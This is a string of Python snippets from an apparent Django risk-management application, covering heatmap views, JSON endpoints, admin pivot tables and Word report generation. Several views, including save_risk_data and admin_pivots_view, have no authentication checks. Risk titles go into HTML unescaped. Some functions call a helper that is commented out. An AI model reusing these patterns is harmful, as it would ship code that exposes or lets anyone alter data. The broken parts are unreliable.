                map_html += f"<area shape='rect' coords='{x1},{y1},{x2},{y2}' " \
                            f"href='#' onclick='showRiskDetails(\"{risk_type}\", {5-i}, {j+1});'>"
    map_html += "</map>"

    return heatmap_image, map_html



from django.shortcuts import render, get_object_or_404
from orm.models import Risk, Portfolio


def generate_heatmap_for_type(heatmap_type, risks, request):
    likelihood_field, impact_field = f"{heatmap_type}_likelihood", f"{heatmap_type}_impact"

    data = [[[] for _ in range(5)] for _ in range(5)]
    score_data = [[0 for _ in range(5)] for _ in range(5)]

    for risk in risks:
        likelihood = getattr(risk, likelihood_field) - 1
        impact = getattr(risk, impact_field) - 1
        data[likelihood][impact].append({
            "title": risk.title,
            "portfolio": risk.portfolio.name,
            "change_url": f"/risk/{risk.id}/"  # Link to change view
        })
        score_data[likelihood][impact] += getattr(risk, likelihood_field) * getattr(risk, impact_field)

    title = f"{heatmap_type.capitalize()} Risk Heatmap"
    heatmap_image, image_map = generate_new_interactive_heatmap(title, data, score_data, heatmap_type, request)
    return heatmap_image, image_map




from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from .models import Risk, UserProfile

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from django.contrib.auth.decorators import login_required
from .models import Risk, UserProfile

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from django.contrib.auth.decorators import login_required
from .models import Risk, UserProfile

@login_required
def get_risk_details(request):
    user_profile = get_object_or_404(UserProfile, user=request.user)
    risk_type = request.GET.get('type')
    likelihood = int(request.GET.get('likelihood')) - 1
    impact = int(request.GET.get('impact')) - 1

    # Select the appropriate fields based on risk type
    if risk_type == "inherent":
        likelihood_field, impact_field = "inherent_likelihood", "inherent_impact"
    elif risk_type == "residual":
        likelihood_field, impact_field = "residual_likelihood", "residual_impact"
    elif risk_type == "targeted":
        likelihood_field, impact_field = "targeted_likelihood", "targeted_impact"
    else:
        return JsonResponse({"error": "Invalid risk type"}, status=400)

    # Filter risks for users with portfolio access
    if request.user.is_superuser:
        risks = Risk.objects.filter(**{
            likelihood_field: likelihood + 1,
            impact_field: impact + 1
        })
    else:
        # Filter risks where the user has portfolio access
        risks = Risk.objects.filter(
            **{
                likelihood_field: likelihood + 1,
                impact_field: impact + 1,
                "portfolio__user_profiles": user_profile
            }
        )

    # Prepare data for response, marking edit permissions
    risk_data = [{
        "title": risk.title,
        "portfolio": risk.portfolio.name,
        "can_edit": request.user.is_superuser or user_profile in risk.owners.all(),
        "change_url": f"/risk/{risk.id}/"
    } for risk in risks]

    return JsonResponse(risk_data, safe=False)

from django.shortcuts import render, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.http import JsonResponse

@login_required
def new_risk_heatmap_view(request):
    user_profile = get_object_or_404(UserProfile, user=request.user)

    # Fetch all portfolios related to the user's profile
    portfolios = Portfolio.objects.filter(user_profiles=user_profile)

    # Filter risks based on selected portfolios (if any)
    selected_portfolios = request.GET.getlist('portfolios', portfolios.values_list('id', flat=True))
    risks = Risk.objects.filter(portfolio__id__in=selected_portfolios)

    # Initialize the data grid for the heatmap
    heatmap_data = {
        "inherent": [[{'count': 0, 'risk_level': '', 'likelihood': 5 - i, 'impact': j + 1} for j in range(5)] for i in range(5)],
        "residual": [[{'count': 0, 'risk_level': '', 'likelihood': 5 - i, 'impact': j + 1} for j in range(5)] for i in range(5)],
        "targeted": [[{'count': 0, 'risk_level': '', 'likelihood': 5 - i, 'impact': j + 1} for j in range(5)]
                      for i in range(5)]
    }

    # Set thresholds for color-coding
    for i in range(5):
        for j in range(5):
            score = (5 - i) * (j + 1)
            risk_level = "green" if score <= 6 else "orange" if score <= 12 else "red"
            for risk_type in ["inherent", "residual", "targeted"]:
                cell = heatmap_data[risk_type][i][j]
                cell['risk_level'] = risk_level

    # Populate actual risk data into heatmap cells
    for risk in risks:
        for risk_type in ["inherent", "residual", "targeted"]:
            likelihood = 5 - getattr(risk, f"{risk_type}_likelihood")
            impact = getattr(risk, f"{risk_type}_impact") - 1
            cell = heatmap_data[risk_type][likelihood][impact]
            cell['count'] += 1

    return render(request, 'heatmap_new.html', {
        'title': f"Combined Risk Heatmap for {request.user.username}",
        'total_risks': risks.count(),
        'inherent_data': heatmap_data["inherent"],
        'residual_data': heatmap_data["residual"],
        'targeted_data': heatmap_data["targeted"],
        'portfolios': portfolios,
        'selected_portfolios': selected_portfolios,
    })

from django.shortcuts import render
from django.contrib.auth.decorators import login_required

@login_required
def landing_page_view(request):
    # Any context data needed can be added here
    return render(request, 'landing_page.html')


# views.py
from django.shortcuts import render
from django.http import JsonResponse
from .models import Risk, Mitigation, Action, Indicator, Event, Opportunity, ApprovalRequest

def ermapp_view(request, risk_id=None):
    # For a single risk, or general data if no risk_id is specified
    risk = Risk.objects.get(id=risk_id) if risk_id else None
    mitigations = Mitigation.objects.filter(risk=risk) if risk else []
    actions = Action.objects.filter(risk=risk) if risk else []
    indicators = Indicator.objects.filter(risk=risk) if risk else []
    events = Event.objects.filter(risk=risk) if risk else []
    opportunities = Opportunity.objects.filter(risk=risk) if risk else []
    approvals = ApprovalRequest.objects.filter(risk=risk) if risk else []

    context = {
        "risk": risk,
        "mitigations": mitigations,
        "actions": actions,
        "indicators": indicators,
        "events": events,
        "opportunities": opportunities,
        "approvals": approvals,
    }
    return render(request, "ermapp_view.html", context)

from django.http import JsonResponse
from django.views.decorators.http import require_POST
from .models import Mitigation, Action, Indicator, Event, Opportunity  # Import models
import json

@require_POST
def save_risk_data(request):
    data = json.loads(request.body.decode('utf-8'))
    data_type = data.get('type')
    title = data.get('title')
    description = data.get('description')

    # Handle data types
    if data_type == 'mitigation':
        Mitigation.objects.create(title=title, description=description)
    elif data_type == 'action':
        Action.objects.create(title=title, description=description)
    elif data_type == 'indicator':
        Indicator.objects.create(title=title, description=description)
    elif data_type == 'event':
        Event.objects.create(title=title, description=description)
    elif data_type == 'opportunity':
        Opportunity.objects.create(title=title, description=description)
    # elif data_type == 'approval':
    #     Approval.objects.create(rationale=title, description=description)

    return JsonResponse({'status': 'success'})


from django.http import JsonResponse
from django.utils.timezone import now
from .models import ApprovalRequest, Action, Risk

from django.http import JsonResponse
from django.utils.timezone import now
from django.urls import reverse
from .models import ApprovalRequest, Action, Risk

def admin_pivots_view(request):
    if request.headers.get('x-requested-with') == 'XMLHttpRequest':
        data_type = request.GET.get('type')
        
        if data_type == 'approval':
            approval_requests = ApprovalRequest.objects.filter(status='pending').select_related('risk', 'user').values(
                'user__user__username', 'status', 'risk__id', 'risk__title', 'due_date', 'response_date'
            )
            data = [
                {
                    'user': req['user__user__username'],
                    'status': req['status'],
                    'risk_title': f"<a href='/admin/orm/risk/{req['risk__id']}/change/' target='_blank'>{req['risk__title']}</a>",
                    'due_date': req['due_date'].strftime('%Y-%m-%d') if req['due_date'] else '',
                    'response_date': req['response_date'].strftime('%Y-%m-%d') if req['response_date'] else '',
                    'countdown': (req['due_date'] - now().date()).days if req['due_date'] else ''
                }
                for req in approval_requests
            ]
            return JsonResponse({'rows': data})

        elif data_type == 'actions':
            actions = Action.objects.filter(status='pending').select_related('performer').values(
                'performer__user__username', 'status', 'id', 'title', 'deadline'
            )
            data = [
                {
                    'performer': action['performer__user__username'],
                    'status': action['status'],
                    'title': f"<a href='/admin/orm/action/{action['id']}/change/' target='_blank'>{action['title']}</a>",
                    'deadline': action['deadline'].strftime('%Y-%m-%d') if action['deadline'] else '',
                    'countdown': (action['deadline'] - now().date()).days if action['deadline'] else ''
                }
                for action in actions
            ]
            return JsonResponse({'rows': data})

        elif data_type == 'no_owner_risks':
            no_owner_risks = Risk.objects.filter(owners__isnull=True).values('id', 'title')
            data = [
                {
                    'risk_title': f"<a href='/admin/orm/risk/{risk['id']}/change/' target='_blank'>{risk['title']}</a>"
                }
                for risk in no_owner_risks
            ]
            return JsonResponse({'rows': data})

        elif data_type == 'owner_portfolio_category_risk':
            risks = Risk.objects.select_related('portfolio').prefetch_related('owners')
            data = [
                {
                    'owner': risk.owners.first().user.username if risk.owners.exists() else "No Owner",
                    'portfolio': risk.portfolio.name if risk.portfolio else "No Portfolio",
                    'category': risk.category.name if risk.category else "No Category",
                    'risk_title': f"<a href='/admin/orm/risk/{risk.id}/change/' target='_blank'>{risk.title}</a>",
                    'inherent_score': (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0),
                    'residual_score': (risk.residual_likelihood or 0) * (risk.residual_impact or 0),
                    'targeted_score': (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)
                }
                for risk in risks
            ]
            return JsonResponse({'rows': data})

    return render(request, 'admin_pivots.html')


from django.shortcuts import render
from .models import Portfolio

def user_portfolio_report(request):
    # Filter portfolios based on user permissions
    user_portfolios = Portfolio.objects.filter(user_profiles=request.user.userprofile)

    return render(request, 'user_portfolio_report.html', {'portfolios': user_portfolios})

def user_it_report(request):
    # Filter portfolios based on user permissions
    user_portfolios = Portfolio.objects.filter(user_profiles=request.user.userprofile)

    return render(request, 'user_it_report.html', {'portfolios': user_portfolios})




from django.core.management import call_command
from django.http import HttpResponse
import io
from django.contrib.admin.views.decorators import staff_member_required

@staff_member_required
def run_create_approval_requests(request):
    # Capture output in a string buffer
    output = io.StringIO()

    # Replace 'create_missing_approval_requests' with your actual command name
    try:
        call_command('create_missing_approval_requests', stdout=output)
        return HttpResponse(f"Command executed successfully:<br><pre>{output.getvalue()}</pre>")
    except Exception as e:
        return HttpResponse(f"Error executing command: {str(e)}", status=500)


from django.core.management import call_command
from django.http import HttpResponse
import io
from django.contrib.admin.views.decorators import staff_member_required

import io
from django.core.management import call_command
from django.http import HttpResponse
@staff_member_required

def run_send_pending_approvals_and_actions(request):
    output = io.StringIO()
    try:
        call_command('send_pending_approvals', stdout=output)
        return HttpResponse(f"Command executed successfully:<br><pre>{output.getvalue()}</pre>")
    except Exception as e:
        return HttpResponse(f"Error executing command: {str(e)}", status=500)



from docx.shared import Pt, Inches
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from django.utils.timezone import now

def add_project_risk_cover_page_en(document, logo_path, selected_portfolios):
    # Set font to Calibri for the document
    for style in document.styles:
        if style.name == 'Normal':
            style.font.name = 'Calibri'
            style.font.size = Pt(12)

    # Header: Add logo to the header for all pages, aligned to the left
    section = document.sections[0]
    header = section.header
    header_paragraph = header.paragraphs[0]
    header_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.LEFT  # Align logo to the left
    header_run = header_paragraph.add_run()
    header_run.add_picture(logo_path, width=Inches(1.5))  # Adjust width as needed

    # Add title on cover page
    title = document.add_paragraph()
    title_run = title.add_run("Project Risk Report")
    title_run.bold = True
    title_run.font.size = Pt(20)
    title.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Add a line after the title
    title_line = document.add_paragraph()
    title_line.add_run("______________________________________").font.size = Pt(10)
    title_line.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Subtitle for selected portfolios
    subtitle = document.add_paragraph("Selected Project Portfolios:")
    subtitle.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
    subtitle_run = subtitle.add_run()
    subtitle_run.font.size = Pt(14)

    # List each selected portfolio
    for portfolio in selected_portfolios:
        portfolio_paragraph = document.add_paragraph(f"- {portfolio.name}")
        portfolio_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Add space after the portfolio list
    document.add_paragraph("\n")

    # Add date
    date_paragraph = document.add_paragraph()
    date_paragraph.add_run(f"Date: {now().strftime('%d-%m-%Y')}")
    date_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Add "Prepared by" section
    prepared_by = document.add_paragraph("Prepared by: [Your Company Name Here]")
    prepared_by.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Insert a page break before the Table of Contents
    document.add_page_break()



from docx.oxml import OxmlElement
from docx.oxml.ns import qn

def add_table_of_contents_en(document):
    # Add a heading for the Table of Contents
    toc_heading = document.add_paragraph('Table of Contents', style='Heading 2')

    # Create the TOC field element
    paragraph = document.add_paragraph()
    run = paragraph.add_run()

    # Add field code for TOC (Word requires the document to be updated to show the TOC)
    fldChar1 = OxmlElement('w:fldChar')
    fldChar1.set(qn('w:fldCharType'), 'begin')
    run._r.append(fldChar1)

    instrText = OxmlElement('w:instrText')
    instrText.set(qn('xml:space'), 'preserve')
    instrText.text = 'TOC \\o "1-1" \\h \\z \\u'  # TOC field code updated to level 1 only
    run._r.append(instrText)

    fldChar2 = OxmlElement('w:fldChar')
    fldChar2.set(qn('w:fldCharType'), 'end')
    run._r.append(fldChar2)


from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Inches, Pt
from docx.enum.section import WD_ORIENT
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
import re

# import re
# from docx import Document
# from docx.shared import Pt, Inches
# from docx.oxml import OxmlElement
# from docx.oxml.ns import qn
# from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
# from docx.enum.section import WD_ORIENT

# def add_html_to_word(document, paragraph, html_content):
#     """
#     Parses HTML content and adds it to a Word paragraph, converting <b>, <i>, <br>, <ul>, <li>, <strong>, <p>, <em> tags.
#     """
#     html_content = html_content.replace("<br>", "\n")
#     parts = re.split(r'(<b>|</b>|<i>|</i>|<ul>|</ul>|<li>|</li>|<strong>|</strong>|<p>|</p>|<em>|</em>)', html_content)

#     bold = False
#     italic = False
#     for part in parts:
#         if part in ("<b>", "<strong>"):
#             bold = True
#         elif part in ("</b>", "</strong>"):
#             bold = False
#         elif part in ("<i>", "<em>"):
#             italic = True
#         elif part in ("</i>", "</em>"):
#             italic = False
#         elif part == "<ul>":
#             continue
#         elif part == "</ul>":
#             paragraph.add_run("\n")  # End of list
#         elif part == "<li>":
#             run = paragraph.add_run("• ")
#             run.bold = bold
#             run.italic = italic
#             run.font.size = Pt(11)  # Standard font size for bullet points
#         elif part == "</li>":
#             paragraph.add_run("\n")  # End of bullet point
#         elif part == "<p>":
#              continue
#         #     paragraph = document.add_paragraph()
#         #     paragraph.paragraph_format.space_before = Pt(2)
#         #     paragraph.paragraph_format.space_after = Pt(2)
#         #     paragraph.paragraph_format.line_spacing = 1.15
#         elif part == "</p>":
#             continue
#         else:
#             run = paragraph.add_run(part)
#             run.bold = bold
#             run.italic = italic
#             run.font.size = Pt(11)  # Consistent font size

def apply_score_color(cell, score):
    """Applies color based on score value (low: green, moderate: orange, high: red)."""
    if score < 5:
        color = '00FF00'  # Green
    elif 5 <= score < 15:
        color = 'FFFF00'  # orange
    else:
        color = 'FF0000'  # Red

    tc_pr = cell._element.get_or_add_tcPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:fill'), color)
    tc_pr.append(shd)

def add_residual_risk_pivot_section_en(document, selected_portfolios):
    header_color = 'ADD8E6'  # Light blue for headers
    risk_bg_color = 'D9EAD3'  # Light green for risk section
    mitigation_bg_color = 'FCE5CD'  # Light orange for mitigation section

    document.add_page_break()
    document.add_heading('\nAnnex 1 - Risk Registry per Category', level=1)

    document.add_paragraph(
        'The table presents the Risk Registry by Category, providing an organized overview of risks associated with each project. '
        'This grouping facilitates identifying key risk areas and assessing their severity, enabling focus on critical areas for project success.'
    )
    document.add_paragraph(
        'For each risk category, inherent, residual, and targeted risk scores are included, revealing the initial risk level and the post-mitigation risk level. '
        'This summary provides important data for strategic decision-making in project risk management.'
    )

    section = document.sections[-1]
    section.orientation = WD_ORIENT.PORTRAIT
    section.page_width, section.page_height = section.page_height, section.page_width  # Swap back for portrait
    selected_portfolio_ids = [portfolio.id for portfolio in selected_portfolios]
    all_risks = Risk.objects.filter(portfolio_id__in=selected_portfolio_ids).select_related('portfolio', 'category')

    pivot_data = {}
    for risk in all_risks:
        category_name = risk.category.name if risk.category else "Uncategorized"
        if category_name not in pivot_data:
            pivot_data[category_name] = []

        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        pivot_data[category_name].append({
            'title': risk.title,
            'description': risk.description,
            'inherent_score': inherent_score,
            'residual_score': residual_score,
            'targeted_score': targeted_score,
            'inherent_detail': f"{risk.inherent_likelihood} x {risk.inherent_impact}",
            'residual_detail': f"{risk.residual_likelihood} x {risk.residual_impact}",
            'targeted_detail': f"{risk.targeted_likelihood} x {risk.targeted_impact}",
            'mitigations': [(mitigation.title, mitigation.description) for mitigation in risk.mitigations.all()]
        })

    sorted_categories = sorted(pivot_data.keys())

    for category in sorted_categories:
        document.add_page_break()
        document.add_heading(category, level=2)

        risks = pivot_data[category]
        risk_number = 1

        for risk in risks:
            if risk_number > 1:
                document.add_page_break()

            # Table structure for Rank and Scores
            table = document.add_table(rows=2, cols=4)
            table.style = 'Table Grid'
            for col in table.columns:
                col.width = Inches(2)  # Set consistent column width

            # Row 1: Headers for Rank and Scores
            hdr_cells = table.rows[0].cells
            headers = ["Rank", "Inherent Score", "Residual Score", "Targeted Score"]
            for i, header in enumerate(headers):
                hdr_cells[i].text = header
                hdr_cells[i].paragraphs[0].runs[0].bold = True
                hdr_cells[i].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
                tc_pr = hdr_cells[i]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), header_color)
                tc_pr.append(shd)

            # Row 2: Actual Values with Color-coded Scores, centered
            value_cells = table.rows[1].cells
            value_cells[0].text = str(risk_number)
            value_cells[0].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
            value_cells[1].text = f"{risk['inherent_detail']} = {risk['inherent_score']}"
            value_cells[2].text = f"{risk['residual_detail']} = {risk['residual_score']}"
            value_cells[3].text = f"{risk['targeted_detail']} = {risk['targeted_score']}"

            # Apply color based on risk score
            apply_score_color(value_cells[1], risk['inherent_score'])
            apply_score_color(value_cells[2], risk['residual_score'])
            apply_score_color(value_cells[3], risk['targeted_score'])

            # Risk Section Header (left-aligned)
            risk_header = table.add_row().cells
            risk_header[0].merge(risk_header[3])
            risk_header[0].text = "Risk"
            risk_header[0].paragraphs[0].runs[0].bold = True
            risk_header[0].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.LEFT
            tc_pr = risk_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:fill'), risk_bg_color)
            tc_pr.append(shd)

            title_row = table.add_row().cells
            title_row[0].text = "Title"
            title_row[0].paragraphs[0].runs[0].bold = True
            title_row[1].merge(title_row[3])
            title_paragraph = title_row[1].paragraphs[0]
            add_html_to_word(document, title_paragraph, risk['title'])  # Parse HTML in the title field

            # Description Row
            desc_row = table.add_row().cells
            desc_row[0].text = "Description"
            desc_row[0].paragraphs[0].runs[0].bold = True
            desc_row[1].merge(desc_row[3])
            desc_paragraph = desc_row[1].paragraphs[0]
            add_html_to_word(document, desc_paragraph, risk['description'])

            # Mitigations Section Header
            mitigations_header = table.add_row().cells
            mitigations_header[0].merge(mitigations_header[3])
            mitigations_header[0].text = "Mitigations"
            mitigations_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = mitigations_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:fill'), mitigation_bg_color)
            tc_pr.append(shd)

            # Individual Mitigation Rows
            for mitigation_number, (mitigation_title, mitigation_desc) in enumerate(risk['mitigations'], 1):
                mit_title_row = table.add_row().cells
                mit_title_row[0].text = f"Title {mitigation_number}"
                mit_title_row[0].paragraphs[0].runs[0].bold = True
                mit_title_row[1].merge(mit_title_row[3])
                mit_title_paragraph = mit_title_row[1].paragraphs[0]
                add_html_to_word(document, mit_title_paragraph, mitigation_title)

                mit_desc_row = table.add_row().cells
                mit_desc_row[0].text = "Description"
                mit_desc_row[0].paragraphs[0].runs[0].bold = True
                mit_desc_row[1].merge(mit_desc_row[3])
                mit_desc_paragraph = mit_desc_row[1].paragraphs[0]
                add_html_to_word(document, mit_desc_paragraph, mitigation_desc)

            risk_number += 1

def add_residual_risk_list_section_en(document, selected_portfolios):
    header_color = 'ADD8E6'  # Light blue for headers
    risk_bg_color = 'D9EAD3'  # Light green for risk section
    opportunity_bg_color = 'C9DAF8'  # Light blue for opportunity section
    threat_bg_color = 'F4CCCC'  # Light red for threat section
    mitigation_bg_color = 'FCE5CD'  # Light orange for mitigation section

    document.add_page_break()
    document.add_heading('\nRisk List per Category', level=1)

    document.add_paragraph(
        'The table presents the Risk Registry by Category. '
        'This grouping facilitates identifying key risk areas and assessing their severity, enabling focus on critical areas for project success.'
    )
    document.add_paragraph(
        'For each risk category, inherent, residual, and targeted risk scores are included, revealing the initial risk level and the post-mitigation risk level. '
        'This summary provides important data for strategic decision-making in project risk management.'
    )

    section = document.sections[-1]
    section.orientation = WD_ORIENT.PORTRAIT
    section.page_width, section.page_height = section.page_height, section.page_width  # Swap back for portrait

    selected_portfolio_ids = [portfolio.id for portfolio in selected_portfolios]
    all_risks = Risk.objects.filter(portfolio_id__in=selected_portfolio_ids).select_related('portfolio', 'category')

    pivot_data = {}
    for risk in all_risks:
        category_name = risk.category.name if risk.category else "Uncategorized"
        if category_name not in pivot_data:
            pivot_data[category_name] = []

        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        pivot_data[category_name].append({
            'title': risk.title,
            'description': risk.description,
            'inherent_score': inherent_score,
            'residual_score': residual_score,
            'targeted_score': targeted_score,
            'inherent_detail': f"{risk.inherent_likelihood} x {risk.inherent_impact}",
            'residual_detail': f"{risk.residual_likelihood} x {risk.residual_impact}",
            'targeted_detail': f"{risk.targeted_likelihood} x {risk.targeted_impact}",
            'opportunities': [(opportunity.title, opportunity.description) for opportunity in risk.opportunities.all()],
            'threats': [(threat.title, threat.description) for threat in risk.threats.all()],
            'mitigations': [(mitigation.title, mitigation.description) for mitigation in risk.mitigations.all()]
        })

    sorted_categories = sorted(pivot_data.keys())

    for category in sorted_categories:
        document.add_page_break()
        document.add_heading(category, level=2)

        risks = pivot_data[category]
        risk_number = 1

        for risk in risks:
            # Table structure for Rank and Scores
            table = document.add_table(rows=2, cols=4)
            table.style = 'Table Grid'
            for col in table.columns:
                col.width = Inches(2)  # Set consistent column width

            # Row 1: Headers for Rank and Scores
            hdr_cells = table.rows[0].cells
            headers = ["Rank", "Inherent Score", "Residual Score", "Targeted Score"]
            for i, header in enumerate(headers):
                hdr_cells[i].text = header
                hdr_cells[i].paragraphs[0].runs[0].bold = True
                hdr_cells[i].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
                tc_pr = hdr_cells[i]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), header_color)
                tc_pr.append(shd)

            # Row 2: Actual Values with Color-coded Scores, centered
            value_cells = table.rows[1].cells
            value_cells[0].text = str(risk_number)
            value_cells[1].text = f"{risk['inherent_detail']} = {risk['inherent_score']}"
            value_cells[2].text = f"{risk['residual_detail']} = {risk['residual_score']}"
            value_cells[3].text = f"{risk['targeted_detail']} = {risk['targeted_score']}"
            apply_score_color(value_cells[1], risk['inherent_score'])
            apply_score_color(value_cells[2], risk['residual_score'])
            apply_score_color(value_cells[3], risk['targeted_score'])

            # Risk Section Header
            risk_header = table.add_row().cells
            risk_header[0].merge(risk_header[3])
            risk_header[0].text = "Risk"
            risk_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = risk_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:fill'), risk_bg_color)
            tc_pr.append(shd)

            # Title and Description Rows
            add_detail_rows(document, table, risk['title'], risk['description'], "Title", "Description")

            # Opportunities Section (if exists)
            if risk['opportunities']:
                opportunities_header = table.add_row().cells
                opportunities_header[0].merge(opportunities_header[3])
                opportunities_header[0].text = "Opportunities"
                tc_pr = opportunities_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:fill'), opportunity_bg_color)
                tc_pr.append(shd)

                for opportunity_title, opportunity_desc in risk['opportunities']:
                    add_detail_rows(document, table, opportunity_title, opportunity_desc, "Title", "Description")

            # Threats Section (if exists)
            if risk['threats']:
                threats_header = table.add_row().cells
                threats_header[0].merge(threats_header[3])
                threats_header[0].text = "Threats"
                tc_pr = threats_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:fill'), threat_bg_color)
                tc_pr.append(shd)

                for threat_title, threat_desc in risk['threats']:
                    add_detail_rows(document, table, threat_title, threat_desc, "Title", "Description")

            # Mitigations Section
            if risk['mitigations']:
                mitigations_header = table.add_row().cells
                mitigations_header[0].merge(mitigations_header[3])
                mitigations_header[0].text = "Mitigations"
                tc_pr = mitigations_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:fill'), mitigation_bg_color)
                tc_pr.append(shd)

                for mitigation_title, mitigation_desc in risk['mitigations']:
                    add_detail_rows(document, table, mitigation_title, mitigation_desc, "Title", "Description")

            risk_number += 1


def add_detail_rows(document, table, title, description, title_label, description_label):
    title_row = table.add_row().cells
    title_row[0].text = title_label
    title_row[1].merge(title_row[3])
    add_html_to_word(document, title_row[1].paragraphs[0], title)

    desc_row = table.add_row().cells
    desc_row[0].text = description_label
    desc_row[1].merge(desc_row[3])
    add_html_to_word(document, desc_row[1].paragraphs[0], description)

import io
import base64
import re
from docx.shared import Pt, Inches
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from django.utils.timezone import now


def add_executive_summary_project_en(document, selected_portfolios, total_risks, inherent_data, residual_data, targeted_data):
    document.add_page_break()

    # Executive Summary Title
    document.add_heading('\nProject Executive Summary', level=1)

    # Introduction to the Project Risk Report
    document.add_paragraph(
        '\nThis report provides a comprehensive analysis of the risk management activities for the organization’s projects. '
        'The main objective of project risk management is to identify, assess, and mitigate risks associated with the unique requirements '
        'and challenges of each project to ensure successful implementation and efficiency.'
    )

    document.add_paragraph(
        "\nThe following summary provides an overview of the project risk landscape, emphasizing the risk scores for each "
        "risk category: inherent, residual, and targeted scores."
    )

    # Section to list selected portfolios
    document.add_heading('\nExamined Project Portfolios', level=2)
    for portfolio in selected_portfolios:
        document.add_paragraph(f"- {portfolio.name}", style="List Bullet")

    def clean_rich_text(text):
        # Function to clean HTML tags from TinyMCE rich text
        return re.sub(r'<.*?>', '', text)

    for portfolio in selected_portfolios:
        if hasattr(portfolio, 'description') and portfolio.description:
            clean_description = clean_rich_text(portfolio.description)
            document.add_paragraph(f"{portfolio.name}: {clean_description}", style="Body Text")

    # Risk Evaluation Methodology with ALARP Principle
    document.add_heading('\nProject Risk Evaluation Methodology\n', level=2)
    paragraph = document.add_paragraph()
    run1 = paragraph.add_run(
        'Each project risk is evaluated based on two dimensions: the likelihood of occurrence and the potential impact on the project. '
        'The risk score is derived from the product of likelihood and impact (Likelihood x Impact = Risk Score). '
    )
    run2 = paragraph.add_run('Residual risks ')
    run2.bold = True
    run3 = paragraph.add_run(
        'are maintained at the lowest possible level in accordance with the '
    )
    run4 = paragraph.add_run('ALARP (As Low As Reasonably Practicable)')
    run4.bold = True
    run5 = paragraph.add_run(
        ' principle, which seeks to reduce risks as far as is reasonably practicable without disproportionate cost or difficulty.'
    )

    # Likelihood and Impact Score Table
    table = document.add_table(rows=1, cols=3)
    table.style = 'Table Grid'
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Score'
    hdr_cells[1].text = 'Likelihood'
    hdr_cells[2].text = 'Impact'

    table_data = [
         (5, 'Very High: Near certain occurrence', 'Severe impact on the project'),
         (4, 'High: Likely occurrence', 'Significant impact on the project'),
         (3, 'Moderate: Possible occurrence', 'Noticeable impact on the project'),
         (2, 'Low: Small chance of occurrence', 'Limited impact on the project'),
         (1, 'Very Low: Unlikely to occur', 'Minimal impact on the project')
    ]

    for score, likelihood, impact in table_data:
        row_cells = table.add_row().cells
        row_cells[0].text = str(score)
        row_cells[1].text = likelihood
        row_cells[2].text = impact

    # Risk Severity Table with Colors
    document.add_heading('\nProject Risk Severity Categorization\n', level=2)
    severity_table = document.add_table(rows=1, cols=2)
    severity_table.style = 'Table Grid'
    severity_hdr_cells = severity_table.rows[0].cells
    severity_hdr_cells[0].text = 'Risk Score'
    severity_hdr_cells[1].text = 'Severity Level'

    severity_data = [
        ('15 - 25', 'High (Red)', 'FF0000'),
        ('8 - 12', 'Moderate (orange)', 'FFC000'),
        ('1 - 6', 'Low (Green)', '00B050')
    ]

    for score_range, severity, color_hex in severity_data:
        row_cells = severity_table.add_row().cells
        row_cells[0].text = score_range
        row_cells[1].text = severity
        for cell in row_cells:
            tc_pr = cell._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:color'), 'auto')
            shd.set(qn('w:fill'), color_hex)
            tc_pr.append(shd)

    # Summary of Active Project Risks
    document.add_paragraph('\n')

    # Section for Inherent Risk Score
    document.add_heading('\nInherent Project Risk Scores', level=2)
    paragraph1 = document.add_paragraph()
    run1 = paragraph1.add_run('\nThe Inherent Project Risk Score ')
    run1.bold = True
    run2 = paragraph1.add_run(
        'represents the initial level of risk associated with a project without considering mitigation measures. '
        'This score reflects the raw risk embedded in the processes and operations of the project.'
    )

    # Additional explanation paragraph
    paragraph2 = document.add_paragraph(
        'In the construction sector, inherent project risks are particularly high due to demanding conditions and the complex nature '
